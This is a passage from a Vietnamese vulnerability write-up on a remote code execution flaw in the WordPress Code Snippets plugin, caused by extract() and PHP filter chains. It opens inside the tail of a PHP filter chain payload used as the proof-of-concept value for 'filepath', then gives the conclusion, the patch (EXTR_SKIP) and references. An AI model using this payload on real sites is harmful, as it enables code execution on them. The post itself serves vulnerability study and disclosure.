class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM921.NAPLPS<span class="p">|</span>convert.iconv.855.CP936<span class="p">|</span>convert.iconv.IBM-932.UTF-8<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.8859_3.UTF16<span class="p">|</span>convert.iconv.863.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP1046.UTF16<span class="p">|</span>convert.iconv.ISO6937.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP1046.UTF32<span class="p">|</span>convert.iconv.L6.UCS-2<span class="p">|</span>convert.iconv.UTF-16LE.T.61-8BIT<span class="p">|</span>convert.iconv.865.UCS-4LE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.MAC.UTF16<span class="p">|</span>convert.iconv.L8.UTF16BE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CSIBM1161.UNICODE<span class="p">|</span>convert.iconv.ISO-IR-156.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.INIS.UTF16<span class="p">|</span>convert.iconv.CSIBM1133.IBM943<span class="p">|</span>convert.iconv.IBM932.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM1161.IBM-932<span class="p">|</span>convert.iconv.MS932.MS936<span class="p">|</span>convert.iconv.BIG5.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.base64-decode/resource<span class="o">=</span>php://temp</span></span></code></pre></td></tr></table>
</div>
</div><p>Gán giá trị vừa tạo được cho <code>filepath</code></p>
<p><figure><a class="lightgallery" href="/posts/2025-11-27-cve-2025-13035/result.png" title="Kết quả" data-thumbnail="/posts/2025-11-27-cve-2025-13035/result.png" data-sub-html="<h2>Result</h2><p>Kết quả</p>"><img loading="lazy" src='/posts/2025-11-27-cve-2025-13035/result.png' alt="Result" height="862" width="1494"></a><figcaption class="image-caption">Kết quả</figcaption>
  </figure></p>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng trong plugin Code Snippets xuất phát từ việc sử dụng <code>extract()</code> mà không có cơ chế bảo vệ, cho phép ghi đè biến nội bộ và dẫn đến việc thực thi file tuỳ ý thông qua <code>require_once</code>. Khi kết hợp với tùy chọn “Enable file-based execution” và shortcode <code>[code_snippet]</code>, một người dùng có quyền Contributor có thể kích hoạt thực thi mã PHP không mong muốn. Bản vá đã khắc phục vấn đề bằng cách sử dụng <code>EXTR_SKIP</code>, đảm bảo các biến nhạy cảm không bị ghi đè trong quá trình xử lý shortcode.</p>
<h2 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Việc sử dụng <code>extract()</code> mà không kiểm soát biến là rủi ro nghiêm trọng, đặc biệt khi dữ liệu đầu vào đến từ người dùng.</li>
<li>PHP stream wrappers, bao gồm filter chains, có thể trở thành công cụ mạnh mẽ để chuyển đổi dữ liệu thành mã thực thi.</li>
<li>Một tùy chọn cấu hình tưởng chừng vô hại như “Enable file-based execution” có thể mở rộng bề mặt tấn công đáng kể.</li>
<li>Các shortcode WordPress cần được xử lý cẩn trọng vì chúng được Contributor sử dụng trong nội dung bài viết.</li>
<li>Việc bổ sung <code>EXTR_SKIP</code> trong bản vá cho thấy cách đơn giản nhưng hiệu quả để giảm thiểu nguy cơ ghi đè biến nhạy cảm.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/"target="_blank" rel="external nofollow noopener noreferrer">Remote Code Execution (RCE)</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/code-snippets/vulnerability/wordpress-code-snippets-plugin-3-9-1-authenticated-contributor-php-code-injection-via-extract-and-php-filter-chains-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">WordPress Code Snippets Plugin &lt;= 3.9.1 is vulnerable to Remote Code Execution (RCE)</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-12-06-cve-2024-11600/" title="CVE-2024-11600 Analysis &amp; POC">CVE-2024-11600 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-05-cve-2025-48140/" title="CVE-2024-8672 Analysis &amp; POC">CVE-2024-8672 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-04-cve-2024-8672/" title="CVE-2024-8672 Analysis &amp; POC">CVE-2024-8672 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-03-cve-2025-30911/" title="CVE-2025-30911 Analysis &amp; POC">CVE-2025-30911 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-02-cve-2025-52756/" title="CVE-2025-52756 Analysis &amp; POC">CVE-2025-52756 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-12-01-cve-2025-3053/" title="CVE-2025-3053 Analysis &amp; POC">CVE-2025-3053 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-22-cve-2025-9501/" title="CVE-2025-9501 Analysis &amp; POC">CVE-2025-9501 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-12-03 12:25:23">Cập nhật ngày 2025-12-03&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/30d048c33b1ff627ae5c2f053eda1999d866b8f1" rel="external nofollow noopener noreferrer" target="_blank" title="Change ref title&#10&#10Commit: 30d048c33b1ff627ae5c2f053eda1999d866b8f1 [30d048c]&#10Author: w41bu1&#10Date: 2025-12-03 12:25:23"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>30d048c</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-11-27-cve-2025-13035/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-27-CVE-2025-13035%5cindex.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts%5c2025-11-27-CVE-2025-13035%5cindex.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-13035&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-13035&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-27-CVE-2025-13035%5cindex.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file/D:%5cProject%5cw41bu1.github.io%5ccontent%5cposts%5c2025-11-27-CVE-2025-13035%5cindex.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/" data-title="CVE-2025-13035 Analysis &amp; POC" data-hashtags="analyst,plugin,remote code execution"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/" data-title="CVE-2025-13035 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/remote-code-execution/" class="post-tag" title="Nhãn - Remote Code Execution">Remote Code Execution</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2025-11-26-cve-2025-26763/" class="post-nav-item" rel="prev" title="CVE-2025-26763 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-26763 Analysis &amp; POC</a><a href="/vi/posts/2025-11-28-cve-2025-9321/" class="post-nav-item" rel="next" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/6dcfa6ef019bff84bd530e9b77b01613.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
